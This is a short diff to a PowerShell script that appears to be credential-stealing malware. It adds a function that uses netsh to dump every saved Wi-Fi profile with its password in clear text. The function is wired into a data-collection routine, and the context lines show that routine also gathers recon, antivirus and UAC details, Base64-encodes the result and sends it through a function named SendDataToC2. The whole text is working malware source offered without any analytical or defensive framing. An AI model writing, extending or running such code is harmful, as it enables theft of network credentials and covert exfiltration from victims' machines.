@@ -357,6 +357,30 @@ function SendDataToC2 {
 
 }
 
+function WIFIProfilesAndPasswords {
+    [CmdletBinding()]
+    param ()
+
+    $info = @()
+    $info += "== WIFI PROFILES AND KEYS ==`n"
+
+    try {
+        $rawProfiles = netsh wlan show profiles
+        foreach ($line in $rawProfiles) {
+            if ($line -match ":\s*(.+)$") {
+                $name = $matches[1].Trim()
+                $info += "-- Profile: $name --"
+
+                $profileData = netsh wlan show profile name="$name" key=clear
+                $info += $profileData
+                $info += "`n"
+            }
+        }
+    } catch {}
+
+    return $info
+}
+
 # call for storing the information from function
 $info = @()
 $info += BasicReconInformation
@@ -370,6 +394,7 @@ $info += LocalNetworkInfo
 $info += RunningServices
 $info += AntivirusInfo
 $info += UACPolicy
+$info += WIFIProfilesAndPasswords
 
 # sending the data
 $newinfo = ConvertToBase64 -data $info
